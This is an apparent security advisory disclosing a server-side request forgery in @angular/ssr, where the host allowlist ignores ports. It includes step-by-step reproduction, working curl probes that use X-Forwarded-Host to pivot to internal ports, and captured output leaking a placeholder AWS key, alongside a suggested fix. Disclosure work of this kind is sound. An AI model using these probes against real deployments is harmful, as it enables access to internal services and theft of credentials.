# @angular/ssr - SSRF via X-Forwarded-Host port pivot on allowlisted host

**Product:** @angular/ssr
**Repository:** https://github.com/angular/angular-cli
**Component:** `packages/angular/ssr/src/utils/validation.ts:243-260` (`isHostAllowed`) and `packages/angular/ssr/src/utils/validation.ts:81-86` (`validateUrl`)
**Version:** 21.2.8 (latest stable on npm at time of writing). Tested against local checkout commit `012239817487fbd3a404ced3bbf7b8dcbda2ff02` on `main`.
**Type:** CWE-918 (Server-Side Request Forgery)
**CVSS 3.1:** 8.2 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`)

## Description

`@angular/ssr` validates the `X-Forwarded-Host` header against a user-configured `allowedHosts` allowlist before it builds the base URL that the server-side `HttpClient` and `fetch` use for relative requests. The validator compares only the URL hostname against the allowlist. The URL port is not compared.

Per WHATWG, `url.hostname` excludes the port (e.g. `new URL('http://127.0.0.1:13306/').hostname === '127.0.0.1'`). When the allowlist entry is a bare hostname such as `"127.0.0.1"`, a URL with that hostname and any port passes `isHostAllowed`. `X-Forwarded-Port` is separately validated by `VALID_PORT_REGEX = /^\d+$/` which accepts any numeric value. The combined validation therefore allows an attacker who sets `X-Forwarded-Host` (optionally with an inline port) to direct the server-rendering base URL to an arbitrary port on the allowlisted host.

The Angular application, during server rendering, uses the request-reconstructed URL as the base origin for its own relative `HttpClient` calls. Any response returned from the attacker-chosen port is then rendered into the HTML that the server returns to the attacker.

```ts
// packages/angular/ssr/src/utils/validation.ts:81
export function validateUrl(url: URL, allowedHosts: ReadonlySet<string>): void {
  const { hostname } = url;                        // port is not read
  if (!isHostAllowed(hostname, allowedHosts)) {
    throw new Error(`URL with hostname "${hostname}" is not allowed.`);
  }
}

// packages/angular/ssr/src/utils/validation.ts:243
function isHostAllowed(hostname: string, allowedHosts: ReadonlySet<string>): boolean {
  if (allowedHosts.has('*') || allowedHosts.has(hostname)) return true;
  for (const allowedHost of allowedHosts) {
    if (!allowedHost.startsWith('*.')) continue;
    const domain = allowedHost.slice(1);
    if (hostname.endsWith(domain)) return true;
  }
  return false;
}
```

The gap is distinct from CVE-2025-62427 (path-based URL hijack, fixed in PR #31474) and from CVE-2026-27739 (forwarded header validation, fixed in PR #32516). Both earlier fixes are present in the tested build. The port dimension of the allowlist was not considered by either of them.

Note on configuration: users who attempt to harden by writing a port-qualified allowlist entry such as `["127.0.0.1:4200"]` cannot do so. `allowedHosts.has(url.hostname)` compares the literal string `"127.0.0.1:4200"` against `url.hostname` (which is only `"127.0.0.1"`), so every legitimate request is rejected with a 400 and the SSR endpoint falls back to client-side rendering. The only functional configurations are a bare hostname (vulnerable to this issue) or `["*"]` (wildcard bypass).

## Impact

An unauthenticated remote request containing `X-Forwarded-Host: <allowlisted-host>:<target-port>` causes the SSR application to perform HTTP requests from the server to `<target-port>` on the allowlisted host and to inline the response body in the HTML served back.

Reproduced here: a Node HTTP listener on `127.0.0.1:13306` returning `INTERNAL_SECRET_CREDS=aws_key=AKIAXXXXXXXX` is reached by the Angular `HttpClient.get('/api/internal')` call that runs during SSR. The content appears in the HTML body returned to the requester. The same behaviour is observed with any other reachable port; the attacker chooses the port.

No authentication, no user interaction, one request. The response content is echoed back, so this is not blind.

In deployments where the allowlisted hostname also resolves to services on other ports (cloud metadata endpoints, databases, internal admin panels, sidecar containers, local proxies), those services are reachable as if the attacker were co-located with the SSR process.

## Steps to Reproduce

Tested with Node.js 20+. Under 5 minutes end to end.

### 1. Scaffold the application

```bash
cd /tmp
npx -y -p @angular/cli@21.2.8 ng new ssrf-test --ssr --routing=true --style=css --skip-git --skip-install
cd ssrf-test
npm install
```

### 2. Configure the restrictive allowlist

In `angular.json`, under `projects.ssrf-test.architect.build.options`:

```json
"security": { "allowedHosts": ["127.0.0.1"] }
```

### 3. Switch the wildcard route to server-render per request

Replace the body of `src/app/app.routes.server.ts`:

```ts
import { RenderMode, ServerRoute } from '@angular/ssr';

export const serverRoutes: ServerRoute[] = [
  { path: '**', renderMode: RenderMode.Server },
];
```

### 4. Add `HttpClient` and a component that fetches `/api/internal`

`src/app/app.config.ts`:

```ts
import { provideHttpClient, withFetch } from '@angular/common/http';
import { ApplicationConfig, provideBrowserGlobalErrorListeners } from '@angular/core';
import { provideClientHydration, withEventReplay } from '@angular/platform-browser';
import { provideRouter } from '@angular/router';
import { routes } from './app.routes';

export const appConfig: ApplicationConfig = {
  providers: [
    provideBrowserGlobalErrorListeners(),
    provideRouter(routes),
    provideClientHydration(withEventReplay()),
    provideHttpClient(withFetch()),
  ],
};
```

`src/app/app.ts`:

```ts
import { AsyncPipe } from '@angular/common';
import { HttpClient } from '@angular/common/http';
import { Component, inject } from '@angular/core';
import { catchError, map, of } from 'rxjs';

@Component({
  selector: 'app-root',
  imports: [AsyncPipe],
  template: `<pre id="secret">{{ secret$ | async }}</pre>`,
})
export class App {
  private readonly http = inject(HttpClient);
  readonly secret$ = this.http
    .get('/api/internal', { responseType: 'text' })
    .pipe(
      map((r) => `API_RESPONSE=${r}`),
      catchError((e) => of(`API_ERROR=${String(e)}`)),
    );
}
```

### 5. Add a decoy local route in `src/server.ts`

Insert before the existing `app.use(...)` that handles Angular rendering:

```ts
app.get('/api/internal', (_req, res) => {
  res.type('text/plain').send('LOCAL_EXPRESS_ROUTE_SHOULD_NOT_BE_USED');
});
```

### 6. Build and run

```bash
npx ng build
node dist/ssrf-test/server/server.mjs &
```

### 7. Start a listener on the target port

```bash
node -e "
const http = require('http');
http.createServer((req, res) => {
  console.log('victim served', req.url);
  res.end('INTERNAL_SECRET_CREDS=aws_key=AKIAXXXXXXXX');
}).listen(13306, '127.0.0.1');
" &
```

### 8. Run the three probes

```bash
# A. Baseline. HttpClient resolves against own origin, hits the decoy.
curl -s http://127.0.0.1:4200/ | grep -oE 'API_[A-Z]+=[^<]*'
# Expected: API_RESPONSE=LOCAL_EXPRESS_ROUTE_SHOULD_NOT_BE_USED

# B. Exploit. X-Forwarded-Host with inline port redirects HttpClient to 13306.
curl -s http://127.0.0.1:4200/ -H 'X-Forwarded-Host: 127.0.0.1:13306' \
  | grep -oE 'API_[A-Z]+=[^<]*'
# Expected: API_RESPONSE=INTERNAL_SECRET_CREDS=aws_key=AKIAXXXXXXXX

# C. Control. Off-allowlist hostname is rejected.
curl -s http://127.0.0.1:4200/ -H 'X-Forwarded-Host: evil.com:13306'
# Expected: 400. 'URL with hostname "evil.com" is not allowed.'
```

The two-header variant `-H 'X-Forwarded-Host: 127.0.0.1' -H 'X-Forwarded-Port: 13306'` produces the same result.

## Proof of Concept

The PoC is the scaffold above with four minimal edits. No custom bootstrap, no non-default Angular configuration beyond what the Steps to Reproduce specify.

## Evidence

Captured during the run described above.

Test A:
```
$ curl -s http://127.0.0.1:4200/ | grep -oE 'API_[A-Z]+=[^<]*'
API_RESPONSE=LOCAL_EXPRESS_ROUTE_SHOULD_NOT_BE_USED
```
SSR server stdout: `[decoy] /api/internal hit from ::ffff:127.0.0.1`
Listener on `127.0.0.1:13306`: no requests received.

Test B:
```
$ curl -s http://127.0.0.1:4200/ -H 'X-Forwarded-Host: 127.0.0.1:13306' \
    | grep -oE 'API_[A-Z]+=[^<]*'
API_RESPONSE=INTERNAL_SECRET_CREDS=aws_key=AKIAXXXXXXXX
```
Listener on `127.0.0.1:13306`: `victim served /api/internal`.
SSR server stdout: no decoy hit (HttpClient did not contact the local express route).

Test C:
```
$ curl -s http://127.0.0.1:4200/ -H 'X-Forwarded-Host: evil.com:13306'
URL with hostname "evil.com" is not allowed.
```
SSR server stdout: `ERROR: Bad Request ("http://evil.com:13306/"). URL with hostname "evil.com" is not allowed.`

The three probes together isolate the port dimension: baseline establishes that the application does not leak the listener data without the attacker header; the exploit establishes that the attacker-chosen port is actually reached and the response body is returned; the control establishes that hostname validation is operative and rejects off-allowlist hostnames. Only the port is unvalidated.

Substituting `X-Forwarded-Port: 19999` and a second listener on `127.0.0.1:19999` produces the equivalent result with content sourced from that port, ruling out any hardcoded behaviour on 13306. Pointing at a closed port returns `API_ERROR=...` from the `catchError` branch, which makes the gadget usable as a port probe against the allowlisted host.

Configuration variants tested:
- `allowedHosts: []` (scaffold default): every request is rejected with `URL with hostname "127.0.0.1" is not allowed.` and the server falls back to CSR. SSR is non-functional until `allowedHosts` is configured.
- `allowedHosts: ["127.0.0.1"]` (bare hostname): SSR renders. Port pivot reproduces as above.
- `allowedHosts: ["127.0.0.1:4200"]` (port-qualified): every request is rejected. The allowlist entry is compared against `url.hostname` (which is `"127.0.0.1"`, no port), so it never matches. SSR is non-functional.
- `allowedHosts: ["*"]`: SSR renders. Any `X-Forwarded-Host` value is accepted.

The practical consequence is that there is no supported `allowedHosts` syntax that enforces a port constraint. The user's choice is between a non-functional SSR (`[]` or `["host:port"]`) and a vulnerable one (`["host"]` or `["*"]`).

## Suggested Fix

Replace the hostname-only check with an origin-aware check, matching RFC 6454 same-origin semantics:

```ts
export function validateUrl(url: URL, allowedHosts: ReadonlySet<string>): void {
  if (!isOriginAllowed(url, allowedHosts)) {
    throw new Error(`URL with origin "${url.origin}" is not allowed.`);
  }
}

function isOriginAllowed(url: URL, allowed: ReadonlySet<string>): boolean {
  if (allowed.has('*')) return true;

  const hostWithPort = url.port ? `${url.hostname}:${url.port}` : url.hostname;

  // Exact match on "host" or "host:port"
  if (allowed.has(hostWithPort)) return true;

  // Bare hostname entries match only the scheme's default port
  if (!url.port && allowed.has(url.hostname)) return true;

  // *. wildcard subdomain behaviour retained
  for (const entry of allowed) {
    if (!entry.startsWith('*.')) continue;
    const domain = entry.slice(1);
    if (url.hostname.endsWith(domain)) return true;
  }

  return false;
}
```

With this change:
- `allowedHosts: ["app.example.com"]` matches only the default port (80/443) on `app.example.com`. A request whose reconstructed origin is `app.example.com:3306` is rejected.
- `allowedHosts: ["app.example.com:4200"]` matches requests on port 4200 and no others. This is a supported configuration.
- `allowedHosts: ["*"]` remains a documented opt-out.

The schema for `security.allowedHosts` should be updated in the documentation to note that bare hostname entries imply the default port for the scheme.
